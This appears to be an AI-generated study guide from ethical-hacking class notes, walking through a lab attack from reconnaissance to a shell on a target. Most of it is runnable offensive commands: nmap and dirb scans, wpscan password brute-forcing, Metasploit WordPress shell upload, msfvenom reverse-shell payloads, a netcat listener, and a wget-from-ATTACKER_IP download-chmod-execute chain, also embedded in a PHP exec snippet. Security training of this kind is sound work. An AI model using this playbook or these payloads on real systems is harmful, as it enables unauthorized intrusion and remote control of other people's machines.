<img src="https://r2cdn.perplexity.ai/pplx-full-logo-primary-dark%402x.png" class="logo" width="120"/>

## Ethical Hacking Steps (Based on Class Notes)

**Phase 1: Initial Reconnaissance \& Enumeration**

1. **Identify IPs:**
    * Find your attacker machine's IP address: Run `ip a` (look under your network interface, e.g., `ens18`). Let's call this `<ATTACKER_IP>`.
    * Identify the target machine's IP address. Let's call this `<TARGET_IP>`.
2. **Basic Connectivity Check:**
    * Ping the target to ensure it's reachable: `ping <TARGET_IP>`
3. **Port and Service Scanning:**
    * Scan the target for open ports and running service versions: `sudo nmap -sS -sV <TARGET_IP>`
    * Note down interesting open ports (like 80/http, 443/https, 22/ssh, etc.) and the services/versions running on them.
4. **Web Directory \& File Discovery:**
    * If a web server is running (e.g., on port 80), scan for hidden directories and files:
        * Using `dirb`: `dirb http://<TARGET_IP> /usr/share/wordlists/dirb/common.txt` (or another wordlist).
        * Using `dirbuster` (GUI tool): Launch `dirbuster`, set the target URL (`http://<TARGET_IP>`), choose a wordlist (e.g., `/usr/share/wordlists/dirb/common.txt`), turn *off* "Be Recursive", and start.
    * Look for interesting paths like `/admin`, `/login`, `/phpmyadmin`, `/wp-admin`, etc.

**Phase 2: Vulnerability Identification \& Exploitation (Choose path based on findings)**

* **Scenario A: Basic Authentication Found (e.g., `/admin`)**

1. If a directory requires basic HTTP authentication, try to crack it.
2. You need a potential username (e.g., `admin` found via enumeration or guessing).
3. Use `hydra` to brute-force the password (syntax not provided in notes, but this is the tool mentioned).
4. Once credentials (`<USERNAME>:<PASSWORD>`) are found, you can access the protected area. You might use these credentials with `dirb` for further discovery: `dirb http://<TARGET_IP>/admin/ -u <USERNAME>:<PASSWORD>`. Look for file upload features or other vulnerabilities.
* **Scenario B: WordPress Site Identified**

1. Use `wpscan` for detailed enumeration: `sudo wpscan --url http://<TARGET_IP> -e at,ap,u` (enumerates all themes, all plugins, users).
2. Note the WordPress version, theme versions, and plugin versions.
3. **Check for known vulnerabilities:** Search sites like `exploit-db.com` for vulnerabilities in the specific WordPress version, themes, or plugins found. Prioritize "verified" exploits, especially Remote Code Execution (RCE) or Unauthenticated exploits.
        * If an exploit script is found (e.g., a Python script `exploit.py` for a vulnerable plugin): Download it and run it according to its instructions (e.g., `python3 exploit.py http://<TARGET_IP>`). This might grant you access or RCE directly.
4. **Attempt Login Brute-Force:** If you found potential usernames (e.g., `admin`), try brute-forcing the password: `wpscan --url http://<TARGET_IP> --usernames <USERNAME> --passwords /usr/share/wordlists/rockyou.txt` (Note: Use a relevant wordlist; `rockyou.txt` is common but large. Your notes suggest passwords might be within the first few thousand entries).
5. **If Admin Access Gained:**
        * *Method 1 (Manual Theme Edit):* Navigate to Appearance -> Theme Editor. Find a theme PHP file that gets executed (e.g., often related to comments, like `comments.php`, or sometimes `404.php`). **Carefully** replace its content with a PHP web shell or code execution snippet (see Phase 3, Step 3b). Trigger the code by visiting a page that uses that theme file.
        * *Method 2 (Metasploit):* Use the `msfconsole`:
            * `search wordpress shell`
            * Find and `use exploit/unix/webapp/wp_admin_shell_upload`
            * `options` (check required settings)
            * `set RHOSTS <TARGET_IP>`
            * `set USERNAME <ADMIN_USERNAME>`
            * `set PASSWORD <ADMIN_PASSWORD>`
            * `set TARGETURI /` (or the path to the WP root, e.g., `/wordpress/`)
            * `set LHOST <ATTACKER_IP>` (Optional, for the reverse shell payload)
            * `set LPORT <PORT>` (Optional, for the reverse shell payload)
            * `run`
            * This should give you a shell (possibly Meterpreter).
* **Scenario C: phpMyAdmin Found**

1. Identify the phpMyAdmin version (check the login page source code for `v=X.Y.Z` or log in if you have credentials - notes provided `pma:pmapass` as an example for one machine).
2. Search `exploit-db.com` for the specific version (e.g., `phpmyadmin 4.8.1 rce`). Look for verified RCE exploits.
3. If an exploit script is found (e.g., `pma.py`), use it to gain command execution. The example command structure looks like:
`python3 pma.py <TARGET_IP> <TARGET_PORT> <PATH_TO_PHPMYADMIN> <USERNAME> <PASSWORD> 'COMMAND'`
Example: `python3 pma.py 40.0.5.4 80 /phpmyadmin pma pmapass 'whoami'`
4. Use this command execution capability to perform the steps in Phase 3 (specifically Step 3c, the `wget` method).
* **Scenario D: General File Upload / LFI / RCE Vulnerability**

1. If you find a way to upload files, try uploading a web shell (e.g., a simple PHP shell).
2. If you find a Local File Inclusion (LFI) vulnerability, try to leverage it to read sensitive files or potentially combine it with file upload for code execution.
3. If you find any other mechanism that allows executing commands on the target system, use it for Phase 3.

**Phase 3: Gaining Shell Access (Reverse Shell Preferred)**

The most common method described is establishing a Reverse Shell, where the target connects *back* to your attacking machine.

1. **Prepare Attacker - Listener:**
    * Choose a port on your attacker machine that isn't in use (e.g., `4444`, `5555`). Let's call this `<PORT>`.
    * Open a terminal and start a listener using `netcat`: `nc -lvnp <PORT>`
    * Keep this terminal open. It will wait for the target to connect back.
2. **Prepare Attacker - Payload Generation:**
    * Use `msfvenom` to create shellcode. The payload type depends on the target OS and the vulnerability context.
        * **For Linux target (to create an ELF binary):** Use a stageless payload for `nc` compatibility.
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f elf > shell.elf`
(Replace `x64` if target is 32-bit, e.g., `linux/x86/...`). Let's call the output file `<SHELL_FILENAME>.elf`.
        * **For PHP web vulnerability:**
`msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw > shell.php`
Let's call the output file `<SHELL_FILENAME>.php`.
    * **Important:** Make sure `LHOST` is your `<ATTACKER_IP>` and `LPORT` is the `<PORT>` your `nc` listener is using.
3. **Deliver \& Execute Payload on Target:** This is the tricky part with "no general rule," depending on the vulnerability found in Phase 2.
    * **Method A (File Upload):** If you found a file upload vulnerability, upload your generated shell file (e.g., `<SHELL_FILENAME>.php` or `<SHELL_FILENAME>.elf`). Then, find a way to access or execute that uploaded file (e.g., browse to the PHP file's URL, or use another vulnerability to run the ELF binary).
    * **Method B (Direct PHP Execution):** If you can edit/inject PHP code (like the WordPress theme editor):
        * Paste the *content* of your `shell.php` (generated by `msfvenom`) into the editable PHP file on the server.
        * Access the modified page/feature to trigger the code.
    * **Method C (Command Injection / RCE - "CMD Shell" Technique):** If you have a way to execute shell commands on the target (via phpMyAdmin exploit, other RCE):

4. **Attacker:** In a *new* terminal (keep the `nc` listener running), navigate to the directory where you saved `<SHELL_FILENAME>.elf`.
5. **Attacker:** Start a simple web server to serve the shell file: `python3 -m http.server 8000` (This serves files from the current directory on port 8000. Keep this running).
6. **Target (via the RCE vulnerability):** Execute the following commands sequentially (often combined into one line separated by semicolons):
            * `cd /tmp` (Navigate to a writable directory)
            * `rm -f /tmp/<SHELL_FILENAME>.elf` (Optional: remove old attempts)
            * `wget http://<ATTACKER_IP>:8000/<SHELL_FILENAME>.elf` (Download the shell binary from your Python server)
            * `chmod 777 /tmp/<SHELL_FILENAME>.elf` (Make it executable)
            * `/tmp/<SHELL_FILENAME>.elf` (Execute the shell binary)
7. *Example combined command for the phpMyAdmin exploit:*
`python3 pma.py <TARGET_IP> <PORT> <PATH> <USER> <PASS> 'cd /tmp; rm -f /tmp/shell.elf; wget http://<ATTACKER_IP>:8000/shell.elf; chmod 777 /tmp/shell.elf; /tmp/shell.elf'`
8. *Example combined command for PHP `exec` function:*

```php
<?php
$cmd = 'cd /tmp; rm -f /tmp/shell.elf; wget http://<ATTACKER_IP>:8000/shell.elf; chmod 777 /tmp/shell.elf; /tmp/shell.elf';
exec($cmd, $output, $retval);
echo "Command executed. Output: <pre>";
print_r($output);
echo "</pre>";
?>
```

1. **Check Connection:**
    * If successful, your Python web server terminal should show a `200 OK` request for the shell file.
    * Your `nc -lvnp <PORT>` listener terminal should show a "connect to [...] from [...]" message, and you should now have a command prompt (`$` or `#`) from the target machine.

**Phase 4: Shell Stabilization \& Upgrade**

1. **Initial Interaction:** You now have a basic shell. It might be non-interactive or unstable (especially PHP shells, which might time out).
2. **Upgrade to Interactive Shell:** Try to upgrade to a better shell using Python (if available on the target):
`python3 -c 'import pty; pty.spawn("/bin/bash")'`
(If `python3` isn't found, try `python`). This often gives you tab completion, command history (arrow keys), and lets you run interactive commands like `sudo`.
3. **Further Steps (Preview from notes):** Your notes mention Privilege Escalation (PE) using tools like LinPEAS/WinPEAS, checking SUID/SGID binaries, and looking for credentials/misconfigurations as the next likely step after gaining initial shell access.

**Important Considerations from Notes:**

* **File Naming:** If you modify and re-upload a shell file, give it a *new name* (e.g., `shell_v2.elf`) to avoid potential caching issues where the old file is served instead of the new one.
* **Staged vs. Stageless:** Your notes mention `msfvenom` can create staged (`payload/staged/`) vs. stageless (`payload/`) shells. Stageless (like `linux/x64/shell_reverse_tcp`) are simpler, self-contained, and work well with basic `nc` listeners, but might be detected more easily by antivirus. Staged payloads are smaller initially and download the rest later, making them stealthier but often requiring a compatible handler like Metasploit (`msfconsole`) instead of just `nc`.
* **Exploit Reliability:** Stick to "verified" exploits from sources like `exploit-db` when possible for higher success rates.
* **Target Environment:** Adapt payloads (`msfvenom -p ...`) and commands based on the target operating system (Linux vs. Windows) and architecture (x64 vs. x86).

